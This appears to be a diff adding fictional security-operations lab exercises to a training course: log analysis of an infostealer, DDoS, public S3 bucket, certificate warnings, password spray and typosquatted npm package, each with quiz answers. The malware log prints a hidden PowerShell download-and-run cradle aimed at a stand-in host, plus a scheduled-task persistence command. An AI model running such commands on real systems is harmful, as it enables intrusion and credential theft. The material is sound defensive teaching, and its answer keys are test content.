@@ -6060,5 +6060,611 @@
     "url": "https://www.ncsc.gov.uk/guidance/mitigating-malware-and-ransomware-attacks"
    }
   ]
+ },
+ {
+  "id": "malware-tree",
+  "kind": "log",
+  "category": "Security operations",
+  "track": "SOC",
+  "minutes": 10,
+  "lesson": "malware",
+  "title": "What ran on the laptop?",
+  "skill": "Read a process tree: find how malware got in, what it stole and how it stays, then choose the response",
+  "card": "One 'invoice', a hidden script, stolen logins",
+  "intro": "Ashgrove Joinery's EDR flagged a laptop after someone opened an invoice. Follow the process tree from the download to what it did next.",
+  "artifact": {
+   "kind": "log",
+   "name": "EDR process tree: ASH-LT07",
+   "text": "Simulated EDR process tree (simplified export), Ashgrove Joinery (fictional), laptop ASH-LT07 (Windows 11 23H2), user ASH\\k.patel, 18 Nov 2026, times UTC.\nSimplified: indented lines are child processes; real exports carry hashes, IDs and many more fields.\n\n10:01:52  FILE      C:\\Users\\k.patel\\Downloads\\Invoice_Nov_2026.zip saved by msedge.exe (from an email link)\n10:02:14  PROCESS   explorer.exe\n10:02:14    PROCESS   wscript.exe \"C:\\Users\\k.patel\\Downloads\\Invoice_Nov_2026\\Invoice_Nov_2026.pdf.js\"\n10:02:16      PROCESS   powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBi...\n10:02:19        NETWORK   powershell.exe -> 203.0.113.91:443 (cdn-update.example.com, first seen in the company today)\n10:02:20        FILE      created C:\\Users\\k.patel\\AppData\\Roaming\\WinSvc\\winsvc.exe (unsigned)\n10:02:21        PROCESS   C:\\Users\\k.patel\\AppData\\Roaming\\WinSvc\\winsvc.exe\n10:02:24          FILE READ C:\\Users\\k.patel\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\n10:02:24          FILE READ C:\\Users\\k.patel\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\n10:02:31          NETWORK   winsvc.exe -> 203.0.113.91:443 (2.3 MB sent)\n10:02:33          PROCESS   schtasks.exe /Create /SC ONLOGON /TN \"WinSvc Update\" /TR \"C:\\Users\\k.patel\\AppData\\Roaming\\WinSvc\\winsvc.exe\"\n10:03:33  NETWORK   winsvc.exe -> 203.0.113.91:443 every 60 seconds since (14 connections, small replies)\n\nAnalyst's note: the -EncodedCommand text decodes to IEX (New-Object Net.WebClient).DownloadString('https://cdn-update.example.com/u')",
+   "placeholder": "e.g. winsvc"
+  },
+  "steps": [
+   {
+    "type": "text",
+    "q": "Which file did the user open that started it all? (the file name)",
+    "answers": [
+     "Invoice_Nov_2026.pdf.js"
+    ],
+    "hint": "Look at what wscript.exe ran.",
+    "explain": "Invoice_Nov_2026.pdf.js is a script, not a PDF. Windows hides known file extensions by default, so it showed as Invoice_Nov_2026.pdf, and double-clicking a .js file runs it.",
+    "where": ".pdf.js"
+   },
+   {
+    "type": "choice",
+    "q": "Why does the PowerShell line use -WindowStyle Hidden and -EncodedCommand?",
+    "options": [
+     "To run faster",
+     "To hide: no window appears and the command isn't readable at a glance. The note shows it downloads code and runs it",
+     "Because PowerShell needs it to use the internet",
+     "It's how Windows Update works"
+    ],
+    "answer": 1,
+    "explain": "Encoded commands aren't proof of evil on their own (some admin tools use them), but a script from Downloads starting hidden, encoded PowerShell is a classic warning sign.",
+    "where": "EncodedCommand"
+   },
+   {
+    "type": "choice",
+    "q": "What kind of malware is winsvc.exe, judging by what it did?",
+    "options": [
+     "Ransomware",
+     "An infostealer: it read Chrome's saved passwords and cookies and sent 2.3 MB out",
+     "A worm",
+     "Adware"
+    ],
+    "answer": 1,
+    "explain": "Login Data holds saved passwords and Cookies holds signed-in sessions. Reading both, then uploading, is what infostealers do.",
+    "where": "Login Data"
+   },
+   {
+    "type": "choice",
+    "q": "What is the scheduled task 'WinSvc Update' for?",
+    "options": [
+     "Updating Windows",
+     "Persistence: it starts the malware again every time the user logs on",
+     "Deleting the malware later",
+     "Backing up the laptop"
+    ],
+    "answer": 1,
+    "explain": "Malware wants to survive a restart. A scheduled task, a Run key or a new service are common ways; all three are worth checking when cleaning up.",
+    "where": "schtasks"
+   },
+   {
+    "type": "choice",
+    "q": "The connections every 60 seconds since 10:03 are most likely...",
+    "options": [
+     "Windows telemetry",
+     "The malware checking in with its command and control (C2) server for instructions",
+     "Chrome syncing",
+     "A backup"
+    ],
+    "answer": 1,
+    "explain": "Regular, small check-ins to the same new address are a beacon. Blocking 203.0.113.91 and cdn-update.example.com across the company stops it and shows if other machines call it too.",
+    "where": "every 60 seconds"
+   },
+   {
+    "type": "choice",
+    "q": "What should happen next?",
+    "options": [
+     "Delete winsvc.exe and carry on",
+     "Isolate the laptop, then from a clean device reset every password saved in Chrome and sign out all of k.patel's sessions",
+     "Change k.patel's Windows password only",
+     "Run a full antivirus scan and wait"
+    ],
+    "answer": 1,
+    "explain": "The data has already left. Stolen cookies let attackers into accounts without the password or MFA, so sessions must be ended, not just passwords changed. Rebuild the laptop rather than trust a clean-up."
+   },
+   {
+    "type": "choice",
+    "q": "Which change would have stopped this file running on a double-click?",
+    "options": [
+     "A stronger Wi-Fi password",
+     "Set .js (and other script files) to open in Notepad, and show file extensions",
+     "Turn off Chrome's password manager",
+     "Block all .zip files"
+    ],
+    "answer": 1,
+    "explain": "If a script opens as text, nothing runs. Showing extensions also makes .pdf.js look odd. Many organisations set this by Group Policy."
+   }
+  ],
+  "next": [
+   {
+    "label": "NCSC: Mitigating malware and ransomware attacks",
+    "url": "https://www.ncsc.gov.uk/guidance/mitigating-malware-and-ransomware-attacks"
+   }
+  ]
+ },
+ {
+  "id": "ddos-or-busy",
+  "kind": "log",
+  "category": "Security operations",
+  "track": "SOC",
+  "minutes": 8,
+  "lesson": "ddos",
+  "title": "Attack, or just busy?",
+  "skill": "Tell a flash crowd from a DDoS, recognise a reflection attack and know who can stop it",
+  "card": "Two slowdowns, one attack",
+  "intro": "Calder Street Theatre's box office slowed down twice today. Read the monitoring and decide which was customers and which was an attack.",
+  "artifact": {
+   "kind": "log",
+   "name": "Web and firewall summaries",
+   "text": "Simulated monitoring summary, Calder Street Theatre box office (fictional), 21 Nov 2026 (UTC). Internet link: 1 Gbit/s.\nSimplified: per-minute summaries from the edge firewall and the web server, not raw packets.\n\n--- web server (HTTPS) ---\ntime   requests/min  client IPs  top page     status\n09:58         1,210         640  /whats-on    200: 99%\n10:00        38,400      21,950  /tickets     200: 81%  503: 19%   (\"The Lantern\" tickets released at 10:00)\n10:03        35,900      22,410  /tickets     200: 78%  503: 22%\n10:20         6,150       4,020  /tickets     200: 99%\n13:58         1,050         590  /whats-on    200: 99%\n14:02           310         212  /whats-on    200: 64%  timeouts: 36%\n14:05           180         140  /whats-on    200: 51%  timeouts: 49%\n\n--- edge firewall ---\ntime   link in      top traffic                         sources\n09:58   42 Mbit/s   TCP to 443 (HTTPS)                     640\n10:00  310 Mbit/s   TCP to 443 (HTTPS)                  21,950\n13:58   39 Mbit/s   TCP to 443 (HTTPS)                     590\n14:02  996 Mbit/s   UDP from source port 123 (NTP)      21,300   dropped by rule: no NTP replies expected\n14:05  998 Mbit/s   UDP from source port 123 (NTP)      21,480   dropped by rule",
+   "placeholder": "e.g. 14:02"
+  },
+  "steps": [
+   {
+    "type": "choice",
+    "q": "What happened at 10:00?",
+    "options": [
+     "A DDoS attack: 38,400 requests a minute",
+     "A flash crowd: real customers arriving for a ticket release, using the site normally",
+     "A hacker stealing tickets",
+     "The firewall failed"
+    ],
+    "answer": 1,
+    "explain": "The spike starts exactly when tickets go on sale, the traffic is normal HTTPS to /tickets, and it fades as tickets sell. That's demand, not an attack, even though some people got errors.",
+    "where": "tickets released"
+   },
+   {
+    "type": "choice",
+    "q": "Some customers got 503 errors at 10:00. What's the right fix for next time?",
+    "options": [
+     "Block the busiest IP addresses",
+     "Add capacity or a queue page before the release, and test it under load",
+     "Report it to the police",
+     "Turn off HTTPS to save processing"
+    ],
+    "answer": 1,
+    "explain": "503 means the server was too busy. Blocking customers would make it worse. A virtual queue, caching and extra capacity are how big ticket sales cope."
+   },
+   {
+    "type": "text",
+    "q": "The 14:02 flood comes from which UDP source port?",
+    "answers": [
+     "123"
+    ],
+    "explain": "Port 123 is NTP, the time protocol. Nobody at the theatre asked 21,300 servers for the time.",
+    "where": "source port 123"
+   },
+   {
+    "type": "choice",
+    "q": "What kind of attack is the 14:02 flood?",
+    "options": [
+     "A flash crowd",
+     "A reflection (amplification) DDoS: the attacker sent small NTP requests with the theatre's address faked, so thousands of servers sent large replies to the theatre",
+     "SQL injection",
+     "A port scan"
+    ],
+    "answer": 1,
+    "explain": "Reflection hides the attacker behind innocent servers, and amplification turns a small request into a big reply. The flood is real traffic from real NTP servers, which is why there are so many sources."
+   },
+   {
+    "type": "choice",
+    "q": "The firewall drops every NTP packet, yet customers still time out. Why?",
+    "options": [
+     "The firewall rule is wrong",
+     "The 1 Gbit/s link is already full before traffic reaches the firewall, so there's no room left for customers",
+     "The web server crashed",
+     "Customers use NTP"
+    ],
+    "answer": 1,
+    "explain": "Dropping packets at your own edge is too late for a volumetric attack: the pipe is full. It has to be filtered upstream.",
+    "where": "998 Mbit/s"
+   },
+   {
+    "type": "choice",
+    "q": "Who can actually stop the 14:02 attack?",
+    "options": [
+     "The theatre's IT person, by restarting the router",
+     "The internet provider or a DDoS protection service, filtering upstream before it reaches the theatre's link",
+     "The ticketing company",
+     "Nobody: wait for it to end"
+    ],
+    "answer": 1,
+    "explain": "Upstream filtering, scrubbing services and content delivery networks have far bigger pipes. Agree how to call them in before an attack, not during one."
+   }
+  ],
+  "next": [
+   {
+    "label": "NCSC: Denial of service (DoS) guidance",
+    "url": "https://www.ncsc.gov.uk/collection/denial-service-dos-guidance-collection"
+   }
+  ]
+ },
+ {
+  "id": "open-bucket",
+  "kind": "log",
+  "category": "Security operations",
+  "track": "Cloud",
+  "minutes": 10,
+  "lesson": "cloud",
+  "title": "The bucket left open",
+  "skill": "Read an S3 bucket policy and CloudTrail events: find who opened it, who got in and how to share safely",
+  "card": "A 'temporary' share that stayed public",
+  "intro": "Fernlea Care Homes shared a payroll file with an agency through cloud storage. Read the policy and the audit trail to see what went wrong.",
+  "artifact": {
+   "kind": "log",
+   "name": "Bucket policy and CloudTrail",
+   "text": "Simulated evidence, Fernlea Care Homes (fictional), AWS account 111122223333, 26 Nov 2026 (UTC).\nSimplified: CloudTrail events shown one per line with a few key fields; S3 data events (GetObject) were switched on.\n\n--- bucket policy: fernlea-hr-exports ---\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"TempShareForPayrollAgency\",\n      \"Effect\": \"Allow\",\n      \"Principal\": \"*\",\n      \"Action\": \"s3:GetObject\",\n      \"Resource\": \"arn:aws:s3:::fernlea-hr-exports/*\"\n    }\n  ]\n}\n\n--- CloudTrail ---\ntime                  eventName                       user                    sourceIP        detail\n2026-10-02T15:39:51Z  DeleteBucketPublicAccessBlock   IAM user j.reyes        198.51.100.20   bucket fernlea-hr-exports\n2026-10-02T15:41:07Z  PutBucketPolicy                 IAM user j.reyes        198.51.100.20   bucket fernlea-hr-exports\n2026-10-02T16:05:44Z  GetObject                       anonymous               192.0.2.80      payroll/2026-09.csv\n2026-11-24T03:12:09Z  ListBucket                      anonymous               203.0.113.17    AccessDenied\n2026-11-24T03:12:31Z  GetObject                       anonymous               203.0.113.17    payroll/2026-09.csv\n2026-11-24T03:12:32Z  GetObject                       anonymous               203.0.113.17    payroll/2026-10.csv\n2026-11-24T03:12:34Z  GetObject                       anonymous               203.0.113.17    staff/dbs-checks-2026.xlsx\n\nNote from HR: the payroll agency (192.0.2.80) collected the September file on 2 Oct. Nobody removed the policy afterwards.",
+   "placeholder": "e.g. anonymous"
+  },
+  "steps": [
+   {
+    "type": "choice",
+    "q": "What does \"Principal\": \"*\" with s3:GetObject mean?",
+    "options": [
+     "Only Fernlea's staff can read the files",
+     "Anyone on the internet can download any file in the bucket, without logging in, if they know or guess its name",
+     "Nobody can read the files",
+     "Only the payroll agency can read them"
+    ],
+    "answer": 1,
+    "explain": "The * principal means everyone, including anonymous users. The statement doesn't mention the agency at all.",
+    "where": "\"Principal\": \"*\""
+   },
+   {
+    "type": "text",
+    "q": "Which IAM user made the bucket public?",
+    "answers": [
+     "j.reyes"
+    ],
+    "explain": "j.reyes first removed the bucket's Block Public Access setting, then added the policy. AWS blocks public buckets by default, so it took two deliberate steps.",
+    "where": "PutBucketPolicy"
+   },
+   {
+    "type": "choice",
+    "q": "203.0.113.17's ListBucket was denied, yet its GetObject requests worked. Why?",
+    "options": [
+     "The attacker hacked AWS",
+     "The policy allows GetObject (download a named file) but not ListBucket, so they guessed or already knew the file names",
+     "ListBucket is always denied",
+     "The files were encrypted"
+    ],
+    "answer": 1,
+    "explain": "Predictable names like payroll/2026-10.csv are easy to guess, or may have leaked. Not being able to list a bucket is not protection.",
+    "where": "AccessDenied"
+   },
+   {
+    "type": "choice",
+    "q": "Under the shared responsibility model, whose job was it to stop this?",
+    "options": [
+     "AWS's: it's their cloud",
+     "Fernlea's: AWS secures the infrastructure, but the customer is responsible for how they configure access to their data",
+     "The payroll agency's",
+     "Nobody's"
+    ],
+    "answer": 1,
+    "explain": "The cloud provider keeps the service secure and gave safe defaults. Who can read your data is your configuration, so it's yours."
+   },
+   {
+    "type": "choice",
+    "q": "What should Fernlea do now?",
+    "options": [
+     "Delete the CloudTrail logs",
+     "Remove the policy, turn Block Public Access back on, and treat the payroll and DBS files as a personal data breach",
+     "Rename the files",
+     "Ask 203.0.113.17 to delete them"
+    ],
+    "answer": 1,
+    "explain": "Close the hole first, then assess: payroll and criminal record check data about staff is sensitive, so the people affected and probably the ICO need telling.",
+    "where": "dbs-checks"
+   },
+   {
+    "type": "choice",
+    "q": "How should they share a file with the agency next time?",
+    "options": [
+     "The same way, but remember to remove it",
+     "A pre-signed URL that expires (or a proper file transfer service), with Block Public Access left on",
+     "Email the CSV unencrypted",
+     "Put it on a USB stick in the post"
+    ],
+    "answer": 1,
+    "explain": "A pre-signed URL gives one file to whoever has the link, for a limited time, without making anything public. 'Temporary' settings that rely on someone remembering tend to stay."
+   }
+  ],
+  "next": [
+   {
+    "label": "AWS: Blocking public access to your Amazon S3 storage",
+    "url": "https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html"
+   }
+  ]
+ },
+ {
+  "id": "cert-check",
+  "kind": "log",
+  "category": "Security operations",
+  "track": "Foundations",
+  "minutes": 8,
+  "lesson": "certificates",
+  "title": "Why the padlock broke",
+  "skill": "Read a certificate's names, dates and issuer, and match each browser warning to its cause and fix",
+  "card": "Three warnings, three different causes",
+  "intro": "Brightwell Opticians' staff keep hitting certificate warnings. Read the three certificates and work out what's wrong with each.",
+  "artifact": {
+   "kind": "log",
+   "name": "Certificates (openssl output)",
+   "text": "Three certificates from Brightwell Opticians (fictional), checked on 23 Nov 2026. Output from OpenSSL 3.0 (openssl x509 -noout -text),\nsimplified: serial numbers, keys and most extensions are trimmed.\n\n=== 1. https://www.brightwell.example ===\nCertificate:\n    Data:\n        Issuer: C=US, O=Let's Encrypt, CN=R11\n        Validity\n            Not Before: Sep 30 08:14:02 2026 GMT\n            Not After : Dec 29 08:14:01 2026 GMT\n        Subject: CN=www.brightwell.example\n        X509v3 extensions:\n            X509v3 Subject Alternative Name: \n                DNS:www.brightwell.example\nBrowser (Chrome) visiting https://brightwell.example: NET::ERR_CERT_COMMON_NAME_INVALID\n\n=== 2. https://portal.brightwell.example (staff portal) ===\nCertificate:\n    Data:\n        Issuer: C=GB, ST=Greater Manchester, L=Salford, O=Sectigo Limited, CN=Sectigo RSA Domain Validation Secure Server CA\n        Validity\n            Not Before: Nov 14 00:00:00 2025 GMT\n            Not After : Nov 14 23:59:59 2026 GMT\n        Subject: CN=portal.brightwell.example\n        X509v3 extensions:\n            X509v3 Subject Alternative Name: \n                DNS:portal.brightwell.example\nBrowser (Chrome): NET::ERR_CERT_DATE_INVALID\n\n=== 3. https://192.0.2.60 (the office printer's admin page) ===\nCertificate:\n    Data:\n        Issuer: CN=PRN-OFFICE-2\n        Validity\n            Not Before: Mar  3 09:00:00 2024 GMT\n            Not After : Mar  1 09:00:00 2034 GMT\n        Subject: CN=PRN-OFFICE-2\nBrowser (Chrome): NET::ERR_CERT_AUTHORITY_INVALID",
+   "placeholder": "e.g. Not After"
+  },
+  "steps": [
+   {
+    "type": "choice",
+    "q": "Certificate 1 is in date and from a trusted CA. Why does https://brightwell.example (without www) show a warning?",
+    "options": [
+     "Let's Encrypt isn't trusted",
+     "The certificate only names www.brightwell.example. Browsers check the Subject Alternative Name list, and the bare domain isn't on it",
+     "The certificate has expired",
+     "The site needs a paid certificate"
+    ],
+    "answer": 1,
+    "explain": "Browsers match the address you typed against the SAN list (they ignore the CN). Reissue it with both names, or redirect the bare domain using a certificate that covers it.",
+    "where": "Subject Alternative Name"
+   },
+   {
+    "type": "text",
+    "q": "On what date did certificate 2 expire? (e.g. 14 Nov 2026)",
+    "answers": [
+     "14 Nov 2026",
+     "Nov 14 2026",
+     "Nov 14 23:59:59 2026",
+     "14 November 2026",
+     "2026-11-14"
+    ],
+    "explain": "Not After: Nov 14 23:59:59 2026 GMT. Nine days later every visit warns, and staff start learning to click through warnings, which is worse than the outage.",
+    "where": "Not After : Nov 14"
+   },
+   {
+    "type": "choice",
+    "q": "What stops certificate 2 happening again?",
+    "options": [
+     "Buy a ten-year certificate",
+     "Renew automatically (for example with ACME, as Let's Encrypt does) and alert on certificates nearing expiry",
+     "Tell staff to ignore the warning",
+     "Switch the portal to plain HTTP"
+    ],
+    "answer": 1,
+    "explain": "Maximum lifetimes for public certificates are being cut (200 days from March 2026, 47 days by 2029), so renewing by hand will keep failing. Automate and monitor."
+   },
+   {
+    "type": "choice",
+    "q": "How can you tell certificate 3 is self-signed?",
+    "options": [
+     "It lasts ten years",
+     "The Issuer and Subject are the same: the printer vouched for itself, so no trusted CA backs it",
+     "It uses an IP address",
+     "It's a printer"
+    ],
+    "answer": 1,
+    "explain": "A self-signed certificate still encrypts, but nothing proves it belongs to that device, so the browser can't rule out an impostor.",
+    "where": "Issuer: CN=PRN-OFFICE-2"
+   },
+   {
+    "type": "choice",
+    "q": "What's the sensible fix for the printer's warning?",
+    "options": [
+     "Teach staff to click 'Proceed anyway' on every site",
+     "Issue it a certificate from the company's internal CA (trusted on staff devices), and keep the admin page on a management network",
+     "Turn off HTTPS on the printer",
+     "Make the printer's page public"
+    ],
+    "answer": 1,
+    "explain": "Clicking through warnings becomes a habit attackers can exploit. An internal CA gives internal devices trusted certificates without paying for public ones."
+   },
+   {
+    "type": "choice",
+    "q": "Certificate 1 comes from Let's Encrypt for free. Is it weaker than a paid one?",
+    "options": [
+     "Yes: free means weaker encryption",
+     "No: a domain-validated certificate encrypts the same way whoever issues it; paid ones may add support, warranties or company checks",
+     "Yes: it lasts only 90 days so it's less secure",
+     "Only on phones"
+    ],
+    "answer": 1,
+    "explain": "Short lifetimes are a feature: a stolen key is useful for less time. The padlock means the connection is encrypted to that name, not that the business is honest.",
+    "where": "Let's Encrypt"
+   }
+  ],
+  "next": [
+   {
+    "label": "Let's Encrypt: How it works",
+    "url": "https://letsencrypt.org/how-it-works/"
+   }
+  ]
+ },
+ {
+  "id": "signin-spray",
+  "kind": "log",
+  "category": "Security operations",
+  "track": "SOC",
+  "minutes": 8,
+  "lesson": "identity",
+  "title": "One password, every account",
+  "skill": "Spot a password spray in a sign-in log, find the account that fell and close the gap MFA didn't cover",
+  "card": "MFA was on, and a login still got through",
+  "intro": "Thornbury Surveyors uses MFA, yet one account signed in from abroad this morning. Read the sign-in log and work out how.",
+  "artifact": {
+   "kind": "log",
+   "name": "Entra ID sign-ins",
+   "text": "Simulated Microsoft Entra ID sign-in log (simplified), Thornbury Surveyors (fictional), 27 Nov 2026 (UTC). 41 staff accounts.\nSimplified: one line per sign-in with a few fields; error codes are Entra's real AADSTS codes.\n\ntime      user                        client app                        IP              loc result   detail\n09:12:01  a.lewis@thornbury.example   Exchange Online (browser)         203.0.113.140   NL  Failure  50126 invalid username or password\n09:12:03  b.shah@thornbury.example    Exchange Online (browser)         203.0.113.140   NL  Failure  50126 invalid username or password\n09:12:05  c.morgan@thornbury.example  Exchange Online (browser)         203.0.113.140   NL  Failure  50126 invalid username or password\n09:12:07  d.owusu@thornbury.example   Exchange Online (browser)         203.0.113.140   NL  Failure  50126 invalid username or password\n09:12:09  e.kowalski@thornbury.exampleExchange Online (browser)         203.0.113.140   NL  Failure  50126 invalid username or password\n... 34 more lines like these: a different user each time, one attempt each, 2 seconds apart, all 50126 ...\n09:13:22  r.james@thornbury.example   Exchange Online (browser)         203.0.113.140   NL  Success  single-factor authentication; Conditional Access: not applied\n09:31:47  a.lewis@thornbury.example   Exchange Online (browser)         198.51.100.66   GB  Success  multifactor authentication (Authenticator app)\n09:44:10  e.kowalski@thornbury.exampleExchange Online (browser)         198.51.100.66   GB  Failure  50126 invalid username or password\n09:44:31  e.kowalski@thornbury.exampleExchange Online (browser)         198.51.100.66   GB  Success  multifactor authentication (Authenticator app)\n\nConditional Access policy 'Require MFA for all users': excluded group CA-Exclude-Travel (members: r.james, added 3 Mar 2026 for a site visit abroad).\nNote: 198.51.100.66 is the office.",
+   "placeholder": "e.g. r.james"
+  },
+  "steps": [
+   {
+    "type": "choice",
+    "q": "What is 203.0.113.140 doing between 09:12 and 09:13?",
+    "options": [
+     "Brute-forcing one account with many passwords",
+     "Password spraying: trying one common password against every account, once each",
+     "Normal sign-ins from a branch office",
+     "Phishing"
+    ],
+    "answer": 1,
+    "explain": "One attempt per account, a different user each time, stays under lockout limits. Brute force hammers one account and gets it locked.",
+    "where": "a.lewis"
+   },
+   {
+    "type": "text",
+    "q": "Whose password did the attacker guess?",
+    "answers": [
+     "r.james",
+     "r.james@thornbury.example"
+    ],
+    "explain": "r.james is the only success from 203.0.113.140, in the middle of the spray, with a single factor.",
+    "where": "09:13:22"
+   },
+   {
+    "type": "choice",
+    "q": "Everyone else needs MFA. Why did r.james get in with just a password?",
+    "options": [
+     "The attacker approved the MFA prompt",
+     "r.james is in an exclusion group the MFA policy skips, added for a trip in March and never removed",
+     "MFA doesn't work from the Netherlands",
+     "Microsoft had an outage"
+    ],
+    "answer": 1,
+    "explain": "'Conditional Access: not applied' means no policy asked for MFA. Exclusions made for one trip, a broken phone or a service account tend to outlive their reason.",
+    "where": "CA-Exclude-Travel"
+   },
+   {
+    "type": "choice",
+    "q": "e.kowalski failed at 09:44 and then succeeded. Should you worry?",
+    "options": [
+     "Yes: it's the attacker",
+     "Probably not: it's from the office, a typo followed by a sign-in with MFA, and nothing else odd",
+     "Yes: any failure is an attack",
+     "Lock the account to be safe"
+    ],
+    "answer": 1,
+    "explain": "Context matters: the office IP, one mistake, then a normal MFA sign-in. The earlier failure from 203.0.113.140 was the spray, not this.",
+    "where": "09:44:31"
+   },
+   {
+    "type": "choice",
+    "q": "What should happen first?",
+    "options": [
+     "Ask r.james to pick a longer password next time",
+     "Reset r.james's password, revoke their sessions, remove them from the exclusion group, and check their mailbox for new rules and sent mail",
+     "Block the Netherlands",
+     "Turn off MFA, since it didn't help"
+    ],
+    "answer": 1,
+    "explain": "The attacker had the mailbox. Check what they read and sent, and whether forwarding or hiding rules were added: the usual next step towards invoice fraud."
+   },
+   {
+    "type": "choice",
+    "q": "Which change closes the gap for everyone?",
+    "options": [
+     "Make everyone change their password monthly",
+     "Keep MFA exclusions temporary and reviewed (with an end date), alert when an excluded account signs in, and ban common passwords",
+     "Hide the sign-in page",
+     "Add more people to the exclusion group"
+    ],
+    "answer": 1,
+    "explain": "MFA only protects the accounts it covers. Time-limited exclusions, alerts and a banned-password list (Entra has one) shut the gap a spray looks for."
+   }
+  ],
+  "next": [
+   {
+    "label": "Microsoft: Conditional Access policy to require MFA for all users",
+    "url": "https://learn.microsoft.com/en-us/entra/identity/conditional-access/policy-all-users-mfa-strength"
+   }
+  ]
+ },
+ {
+  "id": "typosquat-pr",
+  "kind": "log",
+  "category": "Security operations",
+  "track": "Vulnerability management",
+  "minutes": 8,
+  "lesson": "supply-chain",
+  "title": "One extra letter",
+  "skill": "Spot a typosquatted dependency, understand install scripts and respond to stolen build secrets",
+  "card": "A dependency with one letter too many",
+  "intro": "A pull request at Pennant Travel added a retry library. The tests passed, but the build server did something odd. Review the change.",
+  "artifact": {
+   "kind": "log",
+   "name": "Pull request, registry and CI log",
+   "text": "Simulated evidence, Pennant Travel (fictional) booking app, 28 Nov 2026. Package names are made up for this lab; any real package\nwith the same name is unrelated. Simplified: the diff, registry details and CI log are shortened.\n\n--- pull request #212: \"Add retry to API calls\" (changes to package.json) ---\n   \"dependencies\": {\n     \"express\": \"^4.21.1\",\n-    \"axios\": \"^1.7.7\"\n+    \"axioss\": \"^1.7.7\",\n+    \"axios-retry\": \"^4.5.0\"\n   }\n\n--- registry details for axioss (simulated) ---\naxioss@1.7.7 | MIT | deps: none | versions: 1\npublished 2 days ago by a new account\nweekly downloads: 41\nscripts: { \"postinstall\": \"node setup.js\" }\n\n--- registry details for axios (simulated) ---\naxios@1.7.7 | MIT | deps: 3 | versions: 100+\nweekly downloads: tens of millions\n\n--- CI build log, pull request #212 ---\n10:14:02  npm install\n10:14:09  added 412 packages, and audited 413 packages in 7s\n10:14:09  network monitor: node (setup.js) -> 203.0.113.204:443  POST 3.1 KB\n10:14:10  network monitor: setup.js read environment variables: NPM_TOKEN, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY\n10:15:40  tests passed",
+   "placeholder": "e.g. axioss"
+  },
+  "steps": [
+   {
+    "type": "text",
+    "q": "Which package in the pull request is the impostor?",
+    "answers": [
+     "axioss"
+    ],
+    "explain": "axioss (two s's) replaced axios. It's typosquatting: publishing a package whose name is one slip away from a popular one.",
+    "where": "\"axioss\""
+   },
+   {
+    "type": "choice",
+    "q": "Which registry details are red flags?",
+    "options": [
+     "The MIT licence",
+     "One version, published two days ago by a new account, with 41 downloads, while the real package has tens of millions",
+     "deps: none",
+     "Nothing: version 1.7.7 matches the real one"
+    ],
+    "answer": 1,
+    "explain": "Copying the real version number is a common trick. New, unpopular, single-version packages that look like famous ones deserve a hard look.",
+    "where": "published 2 days ago"
+   },
+   {
+    "type": "choice",
+    "q": "Why does \"postinstall\": \"node setup.js\" matter?",
+    "options": [
+     "It doesn't: it only runs after installing",
+     "It runs the package's own code automatically on every machine that installs it, including developers' laptops and the build server",
+     "It updates the package",
+     "It runs the tests"
+    ],
+    "answer": 1,
+    "explain": "Install scripts run with the same rights as whoever ran npm install, before anyone has used the package.",
+    "where": "postinstall"
+   },
+   {
+    "type": "choice",
+    "q": "The tests passed. Is the build safe?",
+    "options": [
+     "Yes: passing tests prove it",
+     "No: setup.js read the build's secrets and sent 3.1 KB to 203.0.113.204, so assume those secrets are stolen",
+     "Yes: the upload was small",
+     "Only if the app still works"
+    ],
+    "answer": 1,
+    "explain": "The malicious code doesn't need to break anything; it just steals. The tests never saw it.",
+    "where": "AWS_SECRET_ACCESS_KEY"
+   },
+   {
+    "type": "choice",
+    "q": "What should the team do now?",
+    "options": [
+     "Merge the pull request: the tests passed",
+     "Reject it, revoke and replace the NPM token and AWS keys, and check AWS and npm for anything those keys did",
+     "Just rename axioss to axios",
+     "Delete the CI log"
+    ],
+    "answer": 1,
+    "explain": "Rotating stolen credentials is urgent: an npm token could publish a poisoned version of Pennant's own packages, and AWS keys could reach customer data."
+   },
+   {
+    "type": "choice",
+    "q": "Which habit would have caught this before it ran?",
+    "options": [
+     "Installing packages faster",
+     "Review every new dependency (name, age, popularity), keep a lockfile, and run installs in CI with scripts off (npm ci --ignore-scripts) where the project allows it",
+     "Only use packages with MIT licences",
+     "Never use open source"
+    ],
+    "answer": 1,
+    "explain": "Most supply chain defence is noticing what's new. A software bill of materials (SBOM) and dependency alerts help too."
+   }
+  ],
+  "next": [
+   {
+    "label": "NCSC: Supply chain security guidance",
+    "url": "https://www.ncsc.gov.uk/collection/supply-chain-security"
+   }
+  ]
  }
 ]
